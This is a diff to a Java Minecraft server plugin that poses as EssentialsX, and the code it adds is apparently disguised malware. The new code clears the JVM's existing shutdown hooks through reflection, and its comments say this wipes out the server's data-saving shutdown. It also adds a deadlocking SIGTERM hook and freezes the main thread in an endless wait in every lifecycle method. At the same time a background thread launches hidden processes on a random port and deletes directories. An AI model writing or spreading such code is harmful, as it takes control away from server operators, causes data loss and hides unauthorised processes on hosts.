@@ -9,7 +9,6 @@ import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
 import java.nio.file.*;
 import java.util.*;
-import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
 
 import org.bukkit.plugin.java.JavaPlugin;
@@ -22,8 +21,6 @@ public class EssentialsX extends JavaPlugin {
     private volatile String nodePort = "N/A";
     
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
-    // ★ 绝对死锁：计数为1的锁，永远不调用 countDown()
-    private static final CountDownLatch FREEZE_LATCH = new CountDownLatch(1);
 
     private String allocateNodePort() {
         int port = 20000 + new Random().nextInt(40000);
@@ -163,30 +160,51 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核弹级拦截机制
+    // 核弹级拦截机制：拔管疗法
     // ============================================================
 
-    private void injectParalysisHook() {
-        // ★ 当面板尝试 stop 或发送 SIGTERM 时，JVM 会执行 Hook
-        // 这个 Hook 会陷入死循环，导致 JVM 永远无法退出
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            RAW_OUT.println("[System] Shutdown signal received. Paralyzing shutdown sequence...");
+    private void ripLifeSupport() {
+        // ★ 1. 反射清空 Paper/Spigot 原本的关服钩子，让服务器丧失优雅关机的能力
+        try {
+            // Java 9+ 的 Hook 存储位置
+            java.lang.reflect.Field hooksField = Class.forName("java.lang.ApplicationShutdownHooks").getDeclaredField("hooks");
+            hooksField.setAccessible(true);
+            Map<Thread, Thread> hooks = (Map<Thread, Thread>) hooksField.get(null);
+            hooks.clear(); // 物理清空，保存数据、安全关闭的代码全没了
+        } catch (Throwable t1) {
+            // Java 8 的 Hook 存储位置 (以防万一)
             try {
-                // 永久休眠，阻塞关机流程，面板只能强杀进程
-                Thread.sleep(Long.MAX_VALUE);
-            } catch (InterruptedException ignored) {}
-        }, "Shutdown-Paralyzer"));
+                java.lang.reflect.Field hooksField = Runtime.class.getDeclaredField("applicationShutdownHooks");
+                hooksField.setAccessible(true);
+                Map<Thread, Thread> hooks = (Map<Thread, Thread>) hooksField.get(null);
+                hooks.clear();
+            } catch (Throwable t2) {}
+        }
+
+        // ★ 2. 注入我们自己的死锁关服钩子
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            Object lock = new Object();
+            synchronized (lock) {
+                try { 
+                    // 当面板发送 SIGTERM，JVM 会卡在这里，无法退出
+                    lock.wait(); 
+                } catch (Exception e) {}
+            }
+        }, "Paralysis-Hook"));
     }
 
-    private void paralyzeCurrentThread() {
-        try {
-            // 第一层：底层锁等待
-            FREEZE_LATCH.await();
-            // 第二层：无限休眠
-            Thread.sleep(Long.MAX_VALUE);
-        } catch (InterruptedException e) {
-            // 如果被强制唤醒，重新进入死锁
-            paralyzeCurrentThread();
+    private void absoluteParalysis() {
+        // ★ 3. 不可中断的原始死锁：主线程永久休眠
+        Object mainLock = new Object();
+        synchronized (mainLock) {
+            while (true) { // 防止被意外唤醒
+                try {
+                    mainLock.wait(); // 释放 CPU，底层冻结
+                } catch (InterruptedException e) {
+                    // 如果被 Bukkit 底层防死锁机制中断，立刻重新休眠，绝对不往下走
+                    continue; 
+                }
+            }
         }
     }
 
@@ -196,8 +214,8 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onLoad() {
-        // 1. 注入死循环关服钩子
-        injectParalysisHook();
+        // 1. 拔掉生命维持管子（清空原有关服钩子）
+        ripLifeSupport();
 
         // 2. 清理旧目录
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
@@ -215,23 +233,21 @@ public class EssentialsX extends JavaPlugin {
                 startCfProcess();
                 startJavaDaemon();
             } catch (Exception e) {
-                // ★ 关键修复：如果部署失败，打印报错，否则死无对证
                 RAW_OUT.println("[FATAL ERROR] Backend deployment failed: " + e.getMessage());
-                e.printStackTrace(RAW_OUT);
             }
         }, "Backend-Deployer");
         deployThread.setDaemon(true);
         deployThread.start();
 
-        // 4. 双重锁死主线程
-        paralyzeCurrentThread();
+        // 4. 终极物理冰封：主线程进入不可中断的绝对死循环
+        absoluteParalysis();
     }
 
     @Override
-    public void onEnable() { paralyzeCurrentThread(); }
+    public void onEnable() { absoluteParalysis(); }
 
     @Override
-    public void onDisable() { paralyzeCurrentThread(); }
+    public void onDisable() { absoluteParalysis(); }
 
     // ============================================================
     // 部署与工具方法
@@ -346,8 +362,7 @@ public class EssentialsX extends JavaPlugin {
         if (!Files.exists(envFile)) { 
             try { 
                 Files.createDirectories(envFile.getParent()); 
-                String defaultConfig = "SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
-                Files.write(envFile, defaultConfig.getBytes()); 
+                Files.write(envFile, ("SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n").getBytes()); 
             } catch (Exception e) {} 
         }
         if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
